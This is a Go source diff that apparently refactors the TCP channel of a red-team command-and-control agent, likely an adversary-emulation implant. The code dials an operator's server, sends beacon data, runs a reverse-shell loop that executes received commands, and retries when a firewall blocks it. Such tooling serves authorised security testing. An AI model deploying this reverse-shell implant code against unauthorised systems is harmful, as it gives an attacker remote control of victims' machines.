@@ -9,7 +9,6 @@ import (
 	"io"
 	"log"
 	"net"
-	"os"
 	"strings"
 )
 
@@ -19,28 +18,27 @@ func init() {
 	CommunicationChannels["tcp"] = TCP{}
 }
 
-func (contact TCP) Communicate(agent *util.AgentConfig, beacon Beacon) {
-	for {
+func (contact TCP) Communicate(agent *util.AgentConfig, beacon Beacon) Beacon {
+	for agent.Contact == "tcp" {
 		conn, err := net.Dial("tcp", agent.Address)
 	   	if err != nil {
 	   		log.Printf("[-] %s is either unavailable or a firewall is blocking traffic.", agent.Address)
 	   	} else {
-	   		listen(conn, beacon, agent)
+			bufferedSend(conn, beacon)
+
+			//reverse-shell
+			scanner := bufio.NewScanner(conn)
+			for scanner.Scan() {
+				message := strings.TrimSpace(scanner.Text())
+				respond(conn, beacon, message, agent)
+				if agent.Contact != "tcp" {
+					return beacon
+				}
+			}
 	   	}
 	   	jitterSleep(agent.Sleep, "TCP")
 	}
-}
-
-func listen(conn net.Conn, beacon Beacon, agent *util.AgentConfig) {
-	//initial beacon
-	bufferedSend(conn, beacon)
-
-	//reverse-shell
-    scanner := bufio.NewScanner(conn)
-    for scanner.Scan() {
-		message := strings.TrimSpace(scanner.Text())
-		go respond(conn, beacon, message, agent)
-    }
+	return beacon
 }
 
 func respond(conn net.Conn, beacon Beacon, message string, agent *util.AgentConfig){
@@ -58,8 +56,7 @@ func respond(conn net.Conn, beacon Beacon, message string, agent *util.AgentConf
 		link.Pid = pid
 		beacon.Links = append(beacon.Links, link)
 	}
-	pwd, _ := os.Getwd()
-	beacon.Pwd = pwd
+	refreshBeacon(agent, &beacon)
 	bufferedSend(conn, beacon)
 }
 
